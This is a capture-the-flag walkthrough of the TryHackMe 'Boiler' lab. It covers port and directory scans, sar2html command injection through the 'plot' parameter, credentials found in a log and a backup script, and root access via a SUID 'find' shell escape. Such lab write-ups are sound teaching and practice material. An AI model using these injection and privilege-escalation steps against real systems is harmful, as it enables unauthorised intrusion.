+++
title = "THM | Boiler"
+++

# Boiler

## NMAP

```
Open ports on 10.10.56.215:

21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown

>> Starting enumeration of discovered services
   this could take a while, sit tight!

   - saving results in  /home/ismael/Documents/CTF/THM/Boiler/nmap/

>> Scan done. Opening results for review...

   # Nmap 7.92 scan initiated Wed Aug 31 18:22:39 2022 as: nmap -sC -sV -p21,80,10000,55007 -q -4 -oA /home/ismael/Documents/CTF/THM/Boiler/nmap/services 10.10.56.215
   Nmap scan report for 10.10.56.215
   Host is up (0.062s latency).
   
   PORT      STATE SERVICE VERSION
   21/tcp    open  ftp     vsftpd 3.0.3
   |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
   | ftp-syst: 
   |   STAT: 
   | FTP server status:
   |      Connected to ::ffff:10.9.1.220
   |      Logged in as ftp
   |      TYPE: ASCII
   |      No session bandwidth limit
   |      Session timeout in seconds is 300
   |      Control connection is plain text
   |      Data connections will be plain text
   |      At session startup, client count was 4
   |      vsFTPd 3.0.3 - secure, fast, stable
   |_End of status
   80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
   | http-robots.txt: 1 disallowed entry 
   |_/
   |_http-title: Apache2 Ubuntu Default Page: It works
   |_http-server-header: Apache/2.4.18 (Ubuntu)
   10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
   |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
   55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
   |   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
   |_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
   Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   # Nmap done at Wed Aug 31 18:23:18 2022 -- 1 IP address (1 host up) scanned in 39.12 seconds
```

## DIRSEARCH

```
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441

Output File: /home/ismael/.dirsearch/reports/10.10.56.215/_22-08-31_18-39-19.txt

Error Log: /home/ismael/.dirsearch/logs/errors-22-08-31_18-39-19.log

Target: http://10.10.56.215/

[18:39:20] Starting: 
[18:42:28] 200 -   11KB - /index.html
[18:42:32] 301 -  313B  - /joomla  ->  http://10.10.56.215/joomla/
[18:42:32] 301 -  327B  - /joomla/administrator  ->  http://10.10.56.215/joomla/administrator/
[18:42:32] 200 -    5KB - /joomla/administrator/
[18:42:35] 200 -   12KB - /joomla/
[18:42:45] 301 -  313B  - /manual  ->  http://10.10.56.215/manual/
[18:42:45] 200 -  626B  - /manual/
[18:42:45] 200 -  626B  - /manual/index.html
[18:43:12] 200 -  257B  - /robots.txt

Task Completed

┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
└─$ dirsearch -u http://10.10.56.215/joomla  -e php -f -x 400,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441

Output File: /home/ismael/.dirsearch/reports/10.10.56.215/-joomla_22-08-31_18-44-12.txt

Error Log: /home/ismael/.dirsearch/logs/errors-22-08-31_18-44-12.log

Target: http://10.10.56.215/joomla/

[18:44:13] Starting: 
[18:44:47] 200 -    3KB - /joomla/Jenkinsfile
[18:44:47] 200 -   18KB - /joomla/LICENSE.txt
[18:44:48] 200 -    5KB - /joomla/README.txt
[18:44:49] 200 -    6KB - /joomla/README.md
[18:44:55] 301 -  320B  - /joomla/_files  ->  http://10.10.56.215/joomla/_files/
[18:44:55] 200 -  168B  - /joomla/_files/
[18:44:57] 301 -  319B  - /joomla/_test  ->  http://10.10.56.215/joomla/_test/
[18:44:58] 200 -    5KB - /joomla/_test/
[18:45:23] 301 -  327B  - /joomla/administrator  ->  http://10.10.56.215/joomla/administrator/
[18:45:23] 200 -    5KB - /joomla/administrator/
[18:45:23] 200 -   31B  - /joomla/administrator/cache/
[18:45:23] 200 -    2KB - /joomla/administrator/includes/
[18:45:23] 301 -  332B  - /joomla/administrator/logs  ->  http://10.10.56.215/joomla/administrator/logs/
[18:45:23] 200 -   31B  - /joomla/administrator/logs/
[18:45:24] 200 -    5KB - /joomla/administrator/index.php
[18:45:45] 301 -  317B  - /joomla/bin  ->  http://10.10.56.215/joomla/bin/
[18:45:45] 200 -   31B  - /joomla/bin/
[18:45:48] 301 -  319B  - /joomla/build  ->  http://10.10.56.215/joomla/build/
[18:45:48] 200 -    3KB - /joomla/build/
[18:45:48] 200 -    6KB - /joomla/build.xml
[18:45:49] 301 -  319B  - /joomla/cache  ->  http://10.10.56.215/joomla/cache/
[18:45:49] 200 -   31B  - /joomla/cache/
[18:45:52] 200 -   31B  - /joomla/cli/
[18:45:53] 200 -    2KB - /joomla/codeception.yml
[18:45:53] 200 -   31B  - /joomla/components/
[18:45:53] 200 -    2KB - /joomla/composer.json
[18:45:53] 301 -  324B  - /joomla/components  ->  http://10.10.56.215/joomla/components/
[18:45:54] 200 -    0B  - /joomla/configuration.php
[18:45:58] 200 -  117KB - /joomla/composer.lock
[18:46:13] 200 -    3KB - /joomla/htaccess.txt
[18:46:15] 301 -  320B  - /joomla/images  ->  http://10.10.56.215/joomla/images/
[18:46:15] 200 -   31B  - /joomla/images/
[18:46:16] 301 -  322B  - /joomla/includes  ->  http://10.10.56.215/joomla/includes/
[18:46:16] 200 -   31B  - /joomla/includes/
[18:46:16] 303 -    0B  - /joomla/index.php/login/  ->  /joomla/index.php/component/users/?view=login&Itemid=104
[18:46:16] 200 -   12KB - /joomla/index.php
[18:46:17] 301 -  326B  - /joomla/installation  ->  http://10.10.56.215/joomla/installation/
[18:46:17] 200 -    6KB - /joomla/installation/
[18:46:21] 200 -    3KB - /joomla/karma.conf.js
[18:46:21] 301 -  322B  - /joomla/language  ->  http://10.10.56.215/joomla/language/
[18:46:21] 200 -   31B  - /joomla/language/
[18:46:22] 200 -   31B  - /joomla/layouts/
[18:46:22] 301 -  323B  - /joomla/libraries  ->  http://10.10.56.215/joomla/libraries/
[18:46:22] 200 -   31B  - /joomla/libraries/
[18:46:25] 301 -  319B  - /joomla/media  ->  http://10.10.56.215/joomla/media/
[18:46:25] 200 -   31B  - /joomla/media/
[18:46:28] 301 -  321B  - /joomla/modules  ->  http://10.10.56.215/joomla/modules/
[18:46:28] 200 -   31B  - /joomla/modules/
[18:46:39] 200 -    3KB - /joomla/phpunit.xml.dist
[18:46:40] 301 -  321B  - /joomla/plugins  ->  http://10.10.56.215/joomla/plugins/
[18:46:40] 200 -   31B  - /joomla/plugins/
[18:46:44] 200 -  829B  - /joomla/robots.txt.dist
[18:46:53] 301 -  323B  - /joomla/templates  ->  http://10.10.56.215/joomla/templates/
[18:46:53] 200 -   31B  - /joomla/templates/
[18:46:53] 200 -   31B  - /joomla/templates/index.html
[18:46:53] 200 -    0B  - /joomla/templates/beez3/
[18:46:53] 200 -    0B  - /joomla/templates/protostar/
[18:46:53] 200 -    0B  - /joomla/templates/system/
[18:46:54] 301 -  319B  - /joomla/tests  ->  http://10.10.56.215/joomla/tests/
[18:46:54] 200 -    2KB - /joomla/tests/
[18:46:55] 301 -  317B  - /joomla/tmp  ->  http://10.10.56.215/joomla/tmp/
[18:46:55] 200 -   31B  - /joomla/tmp/
[18:47:00] 200 -    2KB - /joomla/web.config.txt
[18:47:06] 301 -  318B  - /joomla/~www  ->  http://10.10.56.215/joomla/~www/
[18:47:06] 200 -  162B  - /joomla/~www/

Task Completed
```

## exploit

let's go see what is in <http://10.10.56.215/joomla/_test/>,

![screenshot from _test](/images/boiler/_test.png)

ok, it's look like a sar2html page let's see if there is som exploit

```zsh
┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
└─$ searchsploit sar2html
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                         | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                             | php/webapps/47204.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

let's see what is this exploit:

```text
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 47204.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Exploit Title: sar2html Remote Code Execution
   2   │ # Date: 01/08/2019
   3   │ # Exploit Author: Furkan KAYAPINAR
   4   │ # Vendor Homepage:https://github.com/cemtan/sar2html
   5   │ # Software Link: https://sourceforge.net/projects/sar2html/
   6   │ # Version: 3.2.1
   7   │ # Tested on: Centos 7
   8   │ 
   9   │ In web application you will see index.php?plot url extension.
  10   │ 
  11   │ http://<ipaddr>/index.php?plot=;<command-here> will execute
  12   │ the command you entered. After command injection press "select # host" then your command's
  13   │ output will appear bottom side of the scroll screen.
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

ok, so we can use this exploit to run some commands, let's use the .py exploit:

```text
┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
└─$ python3 49344.py
Enter The url => http://10.10.56.215/joomla/_test/
Command => ls -la
HPUX
Linux
SunOS
total 124
drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 .
drwxr-xr-x 25 www-data www-data  4096 Aug 22  2019 ..
-rwxr-xr-x  1 www-data www-data 53430 Aug 22  2019 index.php
-rwxr-xr-x  1 www-data www-data   716 Aug 21  2019 log.txt
-rwxr-xr-x  1 www-data www-data 53165 Mar 19  2019 sar2html
drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 sarFILE

Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: <pass>
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

and we get ssh logins so now it's privesc parts !

## privesc

let's connect to ssh on ports 55007:

```text
┌──(ismael㉿kali)-[~/…/CTF/THM/Boiler/exploits]
└─$ ssh basterd@$IP -p 55007    
basterd@10.10.56.215's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Wed Aug 31 19:28:07 2022 from 10.9.1.220
$
```

and look arround

```text
$ ls
backup.sh
```

then we find a file called backup.h let's see what's insight:

```bash
SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
<pass>

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
      echo "Begining copy of" $i  >> $LOG
      scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
      echo $i "completed" >> $LOG
  
  if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
      rm $SOURCE/$i
      echo $i "removed" >> $LOG
      echo "####################" >> $LOG
    else
     echo "Copy not complete" >> $LOG
     exit 0
  fi 
    done

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
$ 
```

so we find some logins :

      - user stoner
      - pass <pass>

try to use it's :

```text
$ su stoner
Password: <pass>
stoner@Vulnerable:/home/basterd$ 
```

and let's go we are stoner now, get the flag :

```text
stoner@Vulnerable:/home/basterd$ cd
stoner@Vulnerable:~$ ls -la
total 28
drwxr-x--- 5 stoner stoner 4096 Aug 31 20:11 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
-rw------- 1 stoner stoner  438 Aug 31 20:11 .bash_history
drwxr-x--- 3 stoner stoner 4096 Aug 31 19:34 .config
drwx------ 2 stoner stoner 4096 Aug 31 19:35 .gnupg
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
<flag>
stoner@Vulnerable:~$ 
```

and let's find some SUID:

```text
stoner@Vulnerable:~$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
stoner@Vulnerable:~$ 
```

and search at [GTFObins](https://gtfobins.github.io/gtfobins/find/#sudo) for `find` :
![screenshot from gtfobins](/images/boiler/GTFObins.png)

and use the cmd give by GTFObins:

```text
stoner@Vulnerable:~$ find . -exec /bin/bash -p \; -quit
bash-4.3# whoami
root
```

YESSS ! root !
so let's get the flag :

```text

bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
<flag>
bash-4.3# 
```

**And that's it, GG**
